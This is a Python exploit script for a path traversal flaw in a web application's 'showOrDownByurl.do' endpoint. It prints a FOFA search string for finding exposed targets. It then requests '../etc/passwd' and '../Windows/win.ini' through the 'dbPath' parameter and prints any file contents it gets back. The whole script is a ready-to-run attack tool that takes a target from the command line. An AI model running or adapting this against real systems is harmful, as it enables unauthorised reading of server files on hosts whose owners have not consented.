#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import argparse
import requests
from itertools import cycle
from Crypto.Cipher import AES
import re
from io import BytesIO
from pathlib import Path


def title():
    print('+          FOFA:body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"')


def run_proto(url):
    con_list = [
        "/systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini",
        "/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd"]
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    for con in con_list:
        vuln_url = url + con
        try:
            session = requests.session()
            session.trust_env = False
            resp = session.get(url=vuln_url, verify=False, headers=headers, timeout=(3, 3))
            # rec = re.search('parent.window.ns_reload', response.text, re.I)
            re_resp = re.search('root:x:0', resp.text, re.I | re.M)
            re_resp1 = re.search(r'\[extensions', resp.text, re.I | re.M)
            if re_resp or re_resp1:
                print(vuln_url + '\t sExist\n\n\n\n')
                print(resp.text)
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False


def run(target):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    parse = argparse.ArgumentParser()
    parse.add_argument('-u', '--url', help='ip:port', default='127.0.0.1:8080')
    args = parse.parse_args()
    targ = args.url
    result = run(targ)

    if result:
        print('Exist')
    else:
        print('UnExist')
